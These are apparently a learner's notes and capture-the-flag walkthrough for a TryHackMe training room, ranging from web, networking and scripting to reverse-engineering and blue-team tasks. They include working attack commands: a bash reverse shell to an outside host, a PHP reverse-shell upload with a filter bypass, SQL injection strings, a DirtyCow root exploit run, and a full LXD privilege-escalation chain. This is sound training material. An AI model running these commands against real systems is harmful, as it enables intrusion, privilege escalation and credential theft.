# Room
https://tryhackme.com/room/learncyberin25days

# Task 1 - Intro
Intro

# Task 2 - Get Connected
Get Connected

# Task 3 - Day 1 - Web Exploitation
* DNS
* IP
* HTTP/S
  * HTTP is an inherently stateless protocol, data does not persist
* Cookies
  * a constrcut that supports user state

Complete questions, CyberChef is your friend:
* https://gchq.github.io/CyberChef/

# Task 4 - Day 2 - Web Exploitation
* GET parameters
  * ?test=value
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
  * ?test=value&test2=value2
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
    * & specifies another parameter name is coming next
    * test2 is the next parameter name
    * = specifies the parameter value is coming next
    * value2 is the paramemter value
* File Uploads
  * file extension filtering is important
* Reverse Shells
* Reverse Shell Listeners

The questions are completed by using the information on the displayed web page.  You will also use file extension bypassing by changing the name of this reverseshell to .jpg.php

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

After the file is uploaded you can start your listener with nc -nvlp and then execute the reverse shell and grab the flag

# Task 5 - Day 3 - Web Exploitation
* Authentication
* Default Credentials
* Dictionary Attacks with Burp Suite

Using Burp Suite intruder with the cluster bomb setting, brute force your way into the web application login system using the provided short list of possible credentials while observing the differences in response output

# Task 6 - Day 4 - Web Exploitation
* Fuzzing
* gobuster
* wfuzz

Wordlists
* https://github.com/danielmiessler/SecLists

# Task 7 - Day 5 - Web Exploitation
* SQL Injection
  * Login Bypass
  * Blind SQL Injection
  * Union SQL Injection
* SQLMap
  * SQLMap and Burp Suite

* Resources
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  * https://github.com/payloadbox/sql-injection-payload-list
  * https://www.codecademy.com/articles/sql-commands

```
' or true --

sqlmap -r r.request --dump-all --dbms sqlite --tamper=space2comment
```

# Task 8 - Day 6 - Web Exploitation
* XSS
  * Stored XSS
  * Reflected XSS
* Detection
  * OWASP ZAP
* Resources
  * https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  * https://github.com/payloadbox/xss-payload-list

# Task 9 - Day 7 - Networking
* IP Address
  * Public
  * Private
  * NAT
* Protocols
  * TCP
    * Three-Way Handshake
    * ISN
    * Reassembly
  * IP
* Wireshark
  * Filters

```
icmp
http.request.method eq get
http.request.method == "GET"
ftp
ftp.request.command == "PASS"
File > Export Objects > HTTP
```

# Task 10 - Day 8 - Networking
* nmap
* scanning
  * three-way handshake
  * connect scan : -sT
  * SYN scan : -sS
  * results
    * SYN/ACK = open
    * RST = closed
    * Multiple attempts = filtered
  * additional types
    * -A - identify services
    * -O - OS detection
    * -p - scan specific port
    * -p- - scan all ports
    * -sV - version and fingerprint
* timing
  * -T0 - stealthiest
  * -T5 - most aggressive
* scripting engine
  * --script

* scanning defense
  * snort
  * suricata

```
map -A -T4 10.10.33.224 | tee nmap.txt
```

# Task 11 - Day 9 - Networking
* FTP
  * TCP 20 - data
  * TCP 21 - commands
* Anonymous login
* ftp 1.2.3.4
* commands
  * ls
  * cd
  * get
  * put

```
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

# Task 12 - Day 10 - Networking
* Samba
* SMB - Windows and Linux support
  * request/response
  * share
  * enumeration
    * enum4linux
  * access
    * smbclient
* NFS - Linux support

```
enum4linux 10.10.178.30 | tee e4l.txt
smbclient //10.10.178.30/tbfc-hr
```

# Task 13 - Day 11 - Networking
* Privilege Escalation
* Permissions
  * User
  * Administrator
* Types of Escalation
  * Horizontal - access another user's resources that has the same permissions as you
  * Vertical - accessing data acting as a higher privileged account
* Checklists
  * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  * https://payatu.com/guide-linux-privilege-escalation
  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
  * https://gtfobins.github.io/
* SUID is a permission added to an executable that allows it to execute as the user that owns the executable
  * find / -perm -u=s -type f 2>/dev/null
  * /bin/bash -p

* Enumeration beyond nmap
  * backups
  * passwords
  * configuration
  * LinEnum

* Resources
  * https://dvwa.co.uk/

# Task 14 - Day 12 - Networking
* Vulnerabilities
  * https://www.rapid7.com/
  * https://attackerkb.com/
  * https://cve.mitre.org/cve/
  * https://www.exploit-db.com/
* CGI
  * /cgi-bin
  * arguments
    * ?&
    * ?&ls
    * URL encoded
      * https://www.techopedia.com/definition/10346/url-encoding
* metasploit
  * search for CVE
  * set targeturi to /cgi-bin/[thescriptname]

# Task 15 - Day 13 - Networking
Challenge Task

* Enumeration - nmap
```
nmap -A -T4 10.10.103.38 | tee nmap.txt
```
* Initial access - telnet
```
telnet 10.10.103.38
```
* Enumeration - system
```
$ pwd
/home/santa
$ whoami
santa
$ sudo -l
[sudo] password for santa: 
Sorry, user santa may not run sudo on christmas.
$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
$ uname -a
Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/issue
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!
```
* Exploiting dirtycow
  * https://dirtycow.ninja/
```
wget http://a.b.c.d/dirty.c
--2021-05-08 17:51:49--  http://a.b.c.d/dirty.c
Connecting to a.b.c.d:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2826 (2.8K) [text/x-csrc]

gcc -pthread dirty.c -o dirty -lcrypt

$ ./dirty                                                                                                                                            
/etc/passwd successfully backed up to /tmp/passwd.bak                                                                                                
Please enter the new password:                                                                                                                       
Complete line:                                                                                                                                       
firefart:fiLU3qfsE1tyU:0:0:pwned:/root:/bin/bash                                                                                                     
                                                                                                                                                     
mmap: 7f38dfd30000                                                                                                                                   
madvise 0                                                                                                                                            
                                                                                                                                                     
ptrace 0                                                                                                                                             
Done! Check /etc/passwd to see if the new user was created.                                                                                          
You can log in with the username 'firefart' and the password 'blank'.                                                                                
                                                                                                                                                     
                                                                                                                                                     
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
Done! Check /etc/passwd to see if the new user was created.                                                                                          
You can log in with the username 'firefart' and the password 'blank'.                                                                                
                                                                                                                                                     
                                                                                                                                                     
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
$                                                                                                                                                    
$ su firefart                                                                                                                                        
Password:                                                                                                                                            
firefart@christmas:/home/santa# whoami                                                                                                               
firefart                                           
```

# Task 16 - Day 14 - OSINT
OSINT Challenge
* Resources
  * https://namechk.com/
  * https://whatsmyname.app/
  * https://namecheckup.com/
  * https://github.com/WebBreacher/WhatsMyName
  * https://github.com/sherlock-project/sherlock
  * https://yandex.com/images/
  * https://tineye.com/
  * https://www.bing.com/visualsearch?FORM=ILPVIS
  * https://haveibeenpwned.com/
  * https://dehashed.com/
  * https://scylla.so/

# Task 17 - Day 15 - Scripting
* Python
  * interpreted, high level, general purpose programming language
  * variables
    * string
    * integer
    * float
    * list
  * operators : + / * ** % -
  * boolean
    * true
    * false
  * if statements
  * loops
  * libraries
    * https://pypi.org/
  * pass by reference

# Task 18 - Day 16 - Scripting
Challenge - Find the API key using Python

My solution
```
#!/usr/bin/python3
import requests

url = "http://10.10.110.175/api/"
keys = range(1,100,2)

print("Trying API keys against {}".format(url))
print("Scanning keys...")
for k in keys:
    test_url = url + str(k)
    r = requests.get(test_url)
    print(k, end='')
    if "Key not valid" not in r.text:
        print("")
        print("Key found with key {}".format(k))
        print(r.text)
        break
```

# Task 19 - Day 17 - Reverse Engineering
* Machine code
  * encoded as bytes
  * x86-64 - most common
  * readable form = assembly
  * produced by a compiler
  * instruction set
    * 16 bit > 32 bit > 64 bit
  * radare2 - framework for RE and binary analysis

* Practical
  * r2 -d ./filename
    * opens filename in debug mode
  * aa
    * ask r2 to analyze the program
  * ?
    * general help
  * afl | grep main
    * find the main entry point
  * pdf @main
    * print disassembly function for main
  * registers
  * register operations
    * transfer data to and from memory and a register
    * perform arithmetic ops on registers and data
    * transfer control to other parts of the program
  * data types
    * b - byte - 1 byte
    * w - word - 2 byte
    * l - double word - 4 byte
    * q - quad - 8 byte
    * s - single precision - 4 byte
    * l - double precision - 8 byte
  * instructions
  * breakpoints
    * set one with the db command followed by the memory address
      * db 0x00400b55
      * pdf @main again and look for a b to identify your breakpoint
  * dc
    * continue execution
  * px @memory_address_here
    * read memory
  * ood
    * reset file


* Practical challenge
  * r2 -d ./challenge
  * aa
  * pdf @main
  * use db memoryaddress to set breakpoints
  * use dc to execute to breakpoints
  * use px @variable names to discover values that are set

# Task 20 - Day 18 - Reverse Engineering
* .Net framework
  * ILSpy
    * https://github.com/icsharpcode/ILSpy
  * Dotpeek
    * https://www.jetbrains.com/decompiler/

* Practical
  * Use ILSpy on a test application to recover a password and flag

# Task 21 - Day 19 - Web Exploitation
* SSRF - Server-Side Request Forgery
* localtest.me

# Task 22 - Day 20 - Blue Teaming
PowerShell is a cross-platform task automation and configuration management framework

* get-childitem - like dir
  * -path
  * -file
  * -directory
  * -filter
  * -recurse
  * -hidden
  * -erroraction
* get-content - like type/cat
  * -path
* set-location - like cd
* select-string - like grep
* get-help - list help options

```
get-content -path c:\path\to\file.txt | measure-object -word
(get-content -path c:\path\to\file.txt)[index#]
select-string -path c:\path\to\file.txt -pattern 'pattern'
```

# Task 23 - Day 21 - Blue Teaming
* ADS - Alternate Data Streams - a file attribute specific to Windows NTFS.  Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data.  Natively Windows Explorer doesn't display ADS to the user.
* PowerShell
  * get-filehash
    * -algorithm
  * get-item
    * -path
    * -stream *
* strings64 -accepteula file.exe
* wmic process call create $(resolve-path file.exe:streamname)

Challenge
* Use get-filehash, strings64, and wmic process cal to answer questions

# Task 24 - Day 22 - Blue Teaming
* Password Managers
* CyberChef
  * https://gchq.github.io/CyberChef/

Challenge
* Use CyberChef to identify and decode credentials.  A useful online tool in the exercise is also:
  * https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode

# Task 25 - Day 23 - Blue Teaming
* Ransomware - a type of malware that threatens to publish the victim's data or block access to it unless a random is paid

* Mitigations
  * Volume Shadow Copy Service
    * vssadmin
      * list volumes
  * Task Scheduler

Challenge
* Decode a base64 encoded string, search for Ransomware encrypted files, review Task Scheduler to gain more information on the infection, review the VSS scheduled task and find the volume ID, assign a drive letter to a partition and find a hidden folder, restore a backup from version history

# Task 26 - Day 24 - Final Challenge
* Client-side filters
  * Use Burp Suite to intercept JavaScript
* Shell upgrade and stabilization
  * python3 -c 'import pty;pty.spawn("/bin/bash")'
  * export TERM=xterm
  * ctrl+z, stty raw -echo; fg
  * ctrl+c
* MySQL client
  * mysql
    * -u username
    * -p 
    * show databases;
    * use databasename;
    * show tables;
    * select * from users;
  * Hash Cracking resources
    * https://crackstation.net/
    * https://md5decrypt.net/en/
    * https://hashes.com/en/decrypt/hash
  * LXD privilege escalation
    * id - look for lxd group
    * lxc image list
    * lxc init imagename containername -c security.privileged=true
    * lxc config device add containername devicename disk source=/ path=/mnt/root recursive=true
    * lxc start containername
    * lxc exec containername /bin/sh
    * id
    * cd /mnt/root/root
    * https://www.hackingarticles.in/lxd-privilege-escalation/

Final Challenge

* Enumeration - nmap
```
nmap -A -T4 10.10.243.81 | tee nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 19:15 EDT
Nmap scan report for 10.10.243.81
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.61 seconds
```
* Enumeration - gobuster
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.243.81:65000 -t 40 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.81:65000
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/05/18 19:18:10 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/api                  (Status: 301) [Size: 319] [--> http://10.10.243.81:65000/api/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.243.81:65000/assets/]
/grid                 (Status: 301) [Size: 320] [--> http://10.10.243.81:65000/grid/]  
/index.php            (Status: 200) [Size: 800]                                        
/server-status        (Status: 403) [Size: 280]                                        
/uploads.php          (Status: 200) [Size: 1328]                                       
                                                                                       
===============================================================
2021/05/18 19:22:00 Finished
===============================================================
```
* Gaining Access - Uploads
```
Examined the uploads.php page and found a JavaScript filter preventing file upload.  Load Burp and modified option filter to intercept JavaScript.  Reloaded uploads.php page and dropped the filter.js.  Uploaded a test image to confirm file placement.  Directory for uploads was found earlier with gobuster, grid.  Modified standard PHP reverse shell with my local VPN info, uploaded file via uploads.php, spun up a local listener with nc, and then browsed the uploaded reverse shell to create a connection.  Grab web flag in /var/www.
```
* Shell upgrade
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@light-cycle:/var/www$ export TERM=xterm
export TERM=xterm
www-data@light-cycle:/var/www$ ^Z
[1]+  Stopped                 nc -nvlp 5544
$ stty raw -echo; fg
nc -nvlp 5544

www-data@light-cycle:/var/www$ 
```
* Loot
```
Search /var/www for configuration files.  Found hard coded DB creds in the dbauth.php file.
```
* Gaining Access - MySQL
```
www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| tron               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use tron;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_tron |
+----------------+
| users          |
+----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | [removed] |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```
* Cracking
```
Use https://crackstation.net/ to crack the MD5 hash of the user in the users table of the tron DB.
```
* Privilege Escalation - su with cracked creds
```
Use the cracked creds to login as the user you found in the DB and grab the user flag

www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
Password: 
flynn@light-cycle:/var/www/TheGrid/includes$ 
```
* Privilege Escalation - root
```
Abuse the user's groups to escalate to root

flynn@light-cycle:~$ id                                                                                                  
uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)                                                              

flynn@light-cycle:~$ lxc image list
To start your first container, try: lxc launch ubuntu:18.04                                                              
                                                                                                                         
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |                                                                          
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |                                                                          
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      

flynn@light-cycle:~$ lxc init Alpine breakit -c security.privileged=true
Creating breakit                                                                                                         

flynn@light-cycle:~$ lxc config device add breakit go disk source=/ path=/mnt/root recursive=true
Device go added to breakit  

flynn@light-cycle:~$ lxc start breakit           

flynn@light-cycle:~$ lxc list
+---------+---------+----------------------+----------------------------------------------+------------+-----------+
|  NAME   |  STATE  |         IPV4         |                     IPV6                     |    TYPE    | SNAPSHOTS |
+---------+---------+----------------------+----------------------------------------------+------------+-----------+
| breakit | RUNNING | 10.237.59.101 (eth0) | fd42:b037:1b43:2a7c:216:3eff:feff:c93 (eth0) | PERSISTENT | 0         |
+---------+---------+----------------------+----------------------------------------------+------------+-----------+

flynn@light-cycle:~$ lxc exec breakit /bin/sh

~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
```